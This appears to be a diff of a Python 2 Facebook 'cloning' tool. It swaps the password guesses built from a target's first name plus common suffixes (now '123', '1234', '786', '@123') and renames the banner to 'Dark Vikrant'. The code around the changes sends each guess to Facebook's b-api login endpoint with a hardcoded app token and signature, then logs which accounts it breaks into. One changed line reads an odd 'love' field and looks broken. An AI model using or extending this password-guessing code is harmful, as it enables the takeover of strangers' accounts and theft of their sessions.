@@ -1565,7 +1565,7 @@ def pilih_super():
 		try:
 			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			l = json.loads(a.text)
-			pass1 = l['first_name']+'Khan'
+			pass1 = l['first_name']+'123'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			e = json.load(data)
 			if 'access_token' in e:
@@ -1579,7 +1579,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = l['first_name']+'Gupta'
+					pass2 = l['first_name']+'1234'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					e = json.load(data)
 					if 'access_token' in e:
@@ -1607,7 +1607,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = l['first_name'] + '123'
+									pass4 = l['first_name'] + '786'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									e = json.load(data)
 									if 'access_token' in e:
@@ -1621,7 +1621,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = l['first_name'] + 'Thakur'
+											pass5 = l['first_name'] + '@123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											e = json.load(data)
 											if 'access_token' in e:
@@ -1649,7 +1649,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = l['first_name']+'Sharma'
+															pass7 = l['love']+'123'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															e = json.load(data)
 															if 'access_token' in e:
@@ -2361,7 +2361,7 @@ def pilih_isi():
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m          Start Cloning Black Mafia')
+        jalan(' \033[1;95m          Start Cloning Dark Vikrant')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
